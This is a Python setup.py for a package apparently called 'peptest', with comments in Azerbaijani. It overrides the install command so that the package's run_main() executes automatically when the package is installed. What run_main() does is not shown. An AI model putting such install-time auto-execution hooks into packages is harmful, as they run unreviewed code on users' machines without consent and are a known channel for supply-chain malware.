from setuptools import setup, find_packages
from setuptools.command.install import install
import subprocess
import sys
import os
import importlib

class CustomInstallCommand(install):
    """Xüsusi quraşdırma əmri"""
    def run(self):
        # Əvvəlcə standart quraşdırmanı yerinə yetir
        install.run(self)
        
        # Qurşdırma tamamlandıqdan sonra paketi işə sal
        try:
            # Paketin içindəki modulu import et və işə sal
            import peptest
            peptest.run_main()
        except Exception as e:
            print(f"Paket işə salınarkən xəta: {e}")

def get_requirements():
    """Tələb olunan paketləri qaytarır"""
    return [
        "requests>=2.25.1",
        "colorama>=0.4.4",
        "psutil>=5.8.0"
    ]

setup(
    name="peptest",
    version="1.2.1",
    packages=find_packages(),
    install_requires=get_requirements(),
    cmdclass={
        'install': CustomInstallCommand,
    },
    entry_points={
        'console_scripts': [
            'peptest=peptest.main:main',
        ],
    },
    author="siitoogether",
    author_email="anony-0x2@proton.me",
    description="Avtomatik quraşdırılan və işə salınan test paketi",
    long_description=open("README.md").read() if os.path.exists("README.md") else "",
    long_description_content_type="text/markdown",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
        "Development Status :: 4 - Beta",
        "Intended Audience :: Developers",
    ],
    python_requires='>=3.6',
    keywords="test automation package",
    url="https://github.com/username/peptest",
)